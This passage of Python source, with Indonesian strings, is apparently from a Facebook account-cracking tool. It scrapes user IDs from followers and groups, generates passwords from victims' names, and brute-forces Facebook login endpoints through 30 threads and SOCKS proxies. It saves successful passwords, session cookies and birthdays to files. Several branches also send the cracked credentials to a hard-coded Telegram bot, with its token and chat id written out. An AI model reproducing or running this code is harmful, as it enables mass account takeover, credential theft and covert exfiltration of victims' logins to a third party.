		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] akun tidak publik")
		
def crack_group():
	link = input(f' [{hh}<{P}] pastikan group bersifat publik \n id group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] gagal dump group')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(f"\r{P} ─────────────────────────────")
	ro = input(f' [{hh}1{P}] 𝙼𝙾𝙱𝙸𝙻𝙴 (saran)\n [{hh}2{P}] 𝙼𝙱𝙰𝚂𝙸𝙲 (saran)\n [{hh}3{P}] 𝙵𝚁𝙴𝙴 (saran)\n [{hh}4{P}] 𝙼𝙾𝙱𝙸𝙻𝙴v2 (saran)\n metode : ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	elif ro in ['3','03']:metode.append('free')
	elif ro in ['4','04']:metode.append('mobilev2')
	else:metode.append('mobile')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}RANDOM{P}] O / N / R: ')
	if ch in ['o','O']:
		for x in dump:
			id.append(x)
	elif ch in ['n','N']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['r','R']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] VIEW OPTION CHECKPOINT : NO ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] PERLIHATKAN APK AKUN : NO ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] MANUAL [{hh}2{P}] LU BIKIN SENDIRI [{hh}3{P}] DEFAULT : ')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(Kontol,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(Mbasic,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			elif 'mobile' in metode:
				babas.submit(crack2,idf,pwx,"m.facebook.com",awal)
			else:
				babas.submit(crack2,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
	C = input(f' [{hh}>{P}] input sandi belakang nama\n sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] sandi belakang satu kata saja")
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(Kontol,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(Mbasic,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			elif 'mobile' in metode:
				babas.submit(crack2,idf,pwx,"m.facebook.com",awal)
			else:
				babas.submit(crack2,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"{P} ─────────────────────────────")
	print(f' {H}SAVE OK : {sim_ok}\n {K}SAVE CP : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				babas.submit(Kontol,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(Mbasic,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			elif 'mobile' in metode:
				babas.submit(crack2,idf,pwx,"m.facebook.com",awal)
			else:
				babas.submit(crack2,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	#os.popen('play-audio data/selesai.mp3')
				

###---[ MENU CRACK ]---###
resok = []
rescp = []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(redmi)
	ua = ua_set()
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}DHANZ-XD{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
							requests.post(f"https://api.telegram.org/bot6019883505:AAFH92sadRy1-g83oBNCjKL8sV0BtWwprWw/sendMessage?chat_id=6166210108&text={user} | {pw}MISI SETOR RESULT CP OM").json()
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n')
							requests.post(f"https://api.telegram.org/bot6019883505:AAFH92sadRy1-g83oBNCjKL8sV0BtWwprWw/sendMessage?chat_id=6166210108&text={user} | {pw}MISI SETOR RESULT OK OM").json()
							os.popen('play-audio data/cepe.mp3')
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print("\n %s>> %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
						print("\r %s>> %s "%(H,kuki))
						print("\r  %s*--> %s"%(P,ua))
						os.popen('play-audio data/woke.mp3')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	
#METODE M.FACEBOK.COM#
resok = []
rescp = []
def Kontol(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	ua = ua_set()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}M FB{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			ses.headers.update({"Host": url,"upgrade-insecure-requests":"1","user-agent":ua,"accept":"*/*","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":"https://{url}/login.php?skip_api_login=1&api_key=117190508050&kid_directed_site=0&app_id=117190508050&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26auth_type%3Dreauthenticate%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.indievox.com%252Flogin%252Ffacebook%26client_id%3D117190508050%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D819427ef-6b6c-456b-b8c2-833aa552fcfb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.indievox.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=117190508050&kid_directed_site=0&app_id=117190508050&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26auth_type%3Dreauthenticate%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.indievox.com%252Flogin%252Ffacebook%26client_id%3D117190508050%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D819427ef-6b6c-456b-b8c2-833aa552fcfb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.indievox.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":"https://{url}/login.php?skip_api_login=1&api_key=117190508050&kid_directed_site=0&app_id=117190508050&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26auth_type%3Dreauthenticate%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.indievox.com%252Flogin%252Ffacebook%26client_id%3D117190508050%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D819427ef-6b6c-456b-b8c2-833aa552fcfb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.indievox.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D03da9cba7cc21496bf5cac5e0d648fe0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=321785136108017&auth_token=4b7ab68bc1873c78c505f0ae28aa6de2&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D321785136108017%26redirect_uri%3Dhttps%253A%252F%252Fwww.luvtrip.id%252Fsocial-callback%252Ffacebook%26scope%3Demail%26response_type%3Dcode%26state%3DLtLY3JDvvtvur2gFh6JAtl2BUtLTV4uwJu58A4KE%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46e2adb0-b888-4da6-a3d7-72121d1dcfd1%26tp%3Dunspecified&refsrc=deprecated&app_id=321785136108017&cancel=https%3A%2F%2Fwww.luvtrip.id%2Fsocial-callback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DLtLY3JDvvtvur2gFh6JAtl2BUtLTV4uwJu58A4KE%23_%3D_&lwv=100",data=date, headers=head)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{kk}>{P}] Email  : {kk}{idf}{P}          \n [{kk}>{P}] Sandi  : {kk}{pw}          {P}\n [{kk}>{P}] Lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\r [{kk}>{P}] Email  : {kk}{idf}{P}          \n [{kk}>{P}] Sandi  : {kk}{pw}          {P}\n [{kk}>{P}] Device  : {kk}{ua}{H}          \n')
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}|{kuki}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}\n')
						requests.post(f"https://api.telegram.org/bot6019883505:AAFH92sadRy1-g83oBNCjKL8sV0BtWwprWw/sendMessage?chat_id=6166210108&text={user} | {pw}MISI SETOR RESULT OK OM").json()
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1

#METODE MBASIC FACEBOK#
resok = []
rescp = []
def Mbasic(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	proxy = {'http': 'socks5://'+random.choice(pro)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}Mbasic{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ua_rozh()
			head1 = {
			         "Host": url,
			         "upgrade-insecure-requests": "1",
			         "user-agent": "Mozilla/5.0 (Linux; Android 11; V2115A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36",
			         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1",
			         "x-requested-with": "com.mi.globalbrowser",
			         "sec-fetch-site": "none",
			         "sec-fetch-mode": "navigate",
			         "sec-fetch-user": "?1",
			         "sec-fetch-dest": "document",
			         "referer": f"https://{url}",
			         "accept-encoding": "gzip, deflate",
			         "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
			}
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=549445696001141&kid_directed_site=0&app_id=549445696001141&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fscope%3Demail%26client_id%3D549445696001141%26redirect_uri%3Dhttps%253A%252F%252Febooks.gramedia.com%252Fid%252Ffb_api%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4598daec-80f5-4564-83a7-5249d24ed51c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Febooks.gramedia.com%2Fid%2Ffb_api%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",headers=head1).text
			date = {"lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(link)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1), "li": re.search('name="li" value="(.*?)"',str(link)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": idf, "pass": pw}
			head2 = {
			          "Host": url,
			          "content-length": str(random.randint(11,2000)),
			          "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1),
			          "user-agent": ua,
			          "content-type": "application/x-www-form-urlencoded",
			          "accept": "*/*",
			          "origin": f"https://{url}",
			          "x-requested-with": "com.mi.globalbrowser",
			          "sec-fetch-site": "same-origin",
			          "sec-fetch-mode": "cors",
			          "sec-fetch-dest": "empty",
			          "referer": f"https://{url}/login.php?skip_api_login=1&api_key=549445696001141&kid_directed_site=0&app_id=549445696001141&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fscope%3Demail%26client_id%3D549445696001141%26redirect_uri%3Dhttps%253A%252F%252Febooks.gramedia.com%252Fid%252Ffb_api%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4598daec-80f5-4564-83a7-5249d24ed51c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Febooks.gramedia.com%2Fid%2Ffb_api%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
			          "accept-encoding": "gzip, deflate",
			          "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
			}
			bz = ses.post(f"https://{url}/login/device-based/regular/login/?api_key=549445696001141&auth_token=b5e5077d41b877ce7bacb8e3d6c71bda&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fscope%3Demail%26client_id%3D549445696001141%26redirect_uri%3Dhttps%253A%252F%252Febooks.gramedia.com%252Fid%252Ffb_api%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4598daec-80f5-4564-83a7-5249d24ed51c%26tp%3Dunspecified&refsrc=deprecated&app_id=549445696001141&cancel=https%3A%2F%2Febooks.gramedia.com%2Fid%2Ffb_api%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100&locale2=en_GB&refid=9",data=date,headers=head2, proxies=proxy, allow_redirects=False)
			ini_cookie = str(ses.cookies.get_dict())
			if "checkpoint" in ini_cookie:
				try:auten = re.findall("\<title>(.*?)<\/title>",str(bz.text))
				except:auten = ''
				if 'Enter login code to continue' in str(auten):break
				else:
					idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
					data = (f'{idf}|{pw}')
					if data in rescp:pass
					else:
						rescp.append(data)
						cp+=1
						if 'ya' in cepeh:
							cek_opsi(idf,pw,ua)
						else:
							try:
								token = open('.token.txt','r').read()
								bas = {"cookie":open('.cookie.txt','r').read()}
								ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
								m, d, y = ttl.split('/')
								m = tete[m]
								print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
								sapi = f'{idf}|{pw}|{d} {m} {y}'
								open('CP/'+sim_cp,'a').write(sapi+'\n')
								break
							except:
								print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n')
								requests.post(f"https://api.telegram.org/bot6019883505:AAFH92sadRy1-g83oBNCjKL8sV0BtWwprWw/sendMessage?chat_id=6166210108&text={user} | {pw}MISI SETOR RESULT CP OM").json()
								open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
								break
			elif "c_user" in ini_cookie:
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}\n')
						requests.post(f"https://api.telegram.org/bot6019883505:AAFH92sadRy1-g83oBNCjKL8sV0BtWwprWw/sendMessage?chat_id=6166210108&text={user} | {pw}MISI SETOR RESULT OK OM").json()
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break					
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
			Mbasic(idf,pwx,url,awal)
		#except Exception as e:print(e)
	loop+=1
	
#-----CRACK M.FB2 ------#
resok = []
rescp = []
def crack2(idf,pwx,url,awal):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
